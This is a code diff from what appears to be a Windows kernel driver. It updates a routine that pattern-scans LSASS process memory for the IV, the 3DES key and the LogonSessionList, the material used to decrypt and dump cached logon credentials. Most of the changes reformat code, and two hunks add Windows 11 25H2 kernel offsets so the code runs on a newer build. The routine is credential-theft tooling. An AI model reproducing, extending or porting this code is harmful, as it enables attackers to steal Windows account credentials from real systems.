@@ -1255,26 +1255,36 @@ NTSTATUS MemoryHandler::GetLsassMetadata(_In_ ULONG lsassPid) {
 			break;
 		}
 		// Getting the IV
-		PLONG ivAddressOffset = static_cast<PLONG>(FindPattern(IvSignaturePattern, lsaInitializeProtectedMemory, 
-			LsaInitializeProtectedMemoryDistance, &foundIndex, UserMode));
+		PLONG ivAddressOffset = static_cast<PLONG>(FindPattern(IvSignaturePattern, 
+			lsaInitializeProtectedMemory, 
+			LsaInitializeProtectedMemoryDistance, 
+			&foundIndex, 
+			UserMode));
 
 		if (!ivAddressOffset) {
 			status = STATUS_NOT_FOUND;
 			break;
 		}
 		lsassMetadata.IvAddress = static_cast<PVOID>(static_cast<PUCHAR>(lsaInitializeProtectedMemory) +
-			(*ivAddressOffset) + foundIndex + IvSignaturePattern.GetOffsetForVersion(WindowsBuildNumber));
+			(*ivAddressOffset) + 
+			foundIndex + 
+			IvSignaturePattern.GetOffsetForVersion(WindowsBuildNumber));
 
 		// Getting 3DES key
-		PLONG desKeyAddressOffset = static_cast<PLONG>(FindPattern(DesKeySignaturePattern, lsaInitializeProtectedMemory, 
-			LsaInitializeProtectedMemoryDistance, &foundIndex, UserMode));
+		PLONG desKeyAddressOffset = static_cast<PLONG>(FindPattern(DesKeySignaturePattern, 
+			lsaInitializeProtectedMemory, 
+			LsaInitializeProtectedMemoryDistance, 
+			&foundIndex, 
+			UserMode));
 
 		if (!desKeyAddressOffset) {
 			status = STATUS_NOT_FOUND;
 			break;
 		}
 		PBCRYPT_GEN_KEY desKey = reinterpret_cast<PBCRYPT_GEN_KEY>(static_cast<PUCHAR>(lsaInitializeProtectedMemory) +
-			(*desKeyAddressOffset) + foundIndex + DesKeyStructOffset);
+			(*desKeyAddressOffset) + 
+			foundIndex + 
+			DesKeyStructOffset);
 		status = ProbeAddress(desKey, sizeof(BCRYPT_GEN_KEY), __alignof(BCRYPT_GEN_KEY));
 
 		if (!NT_SUCCESS(status))
@@ -1297,8 +1307,11 @@ NTSTATUS MemoryHandler::GetLsassMetadata(_In_ ULONG lsassPid) {
 
 		// Getting LogonSessionList
 		PLONG logonSessionListAddressOffset = static_cast<PLONG>(FindPatterns(LogonSessionListPatterns, 
-			LogonSessionListPatternCount, lsaIGetNbAndDnsDomainNames, LogonSessionListDistance,
-			&foundIndex, UserMode));
+			LogonSessionListPatternCount, 
+			lsaIGetNbAndDnsDomainNames, 
+			LogonSessionListDistance,
+			&foundIndex, 
+			UserMode));
 
 		if (!logonSessionListAddressOffset) {
 			status = STATUS_NOT_FOUND;
@@ -1976,6 +1989,7 @@ ULONG MemoryHandler::GetVadRootOffset() const {
 		vadRootOffset = 0x658;
 		break;
 	case WIN_11_24H2:
+	case WIN_11_25H2:
 		vadRootOffset = 0x558;
 		break;
 	default:
@@ -2018,6 +2032,7 @@ ULONG MemoryHandler::GetPageCommitmentLockOffset() const {
 		pageCommitmentLockOffset = 0x378;
 		break;
 	case WIN_11_24H2:
+	case WIN_11_25H2:
 		pageCommitmentLockOffset = 0x260;
 		break;
 	default:
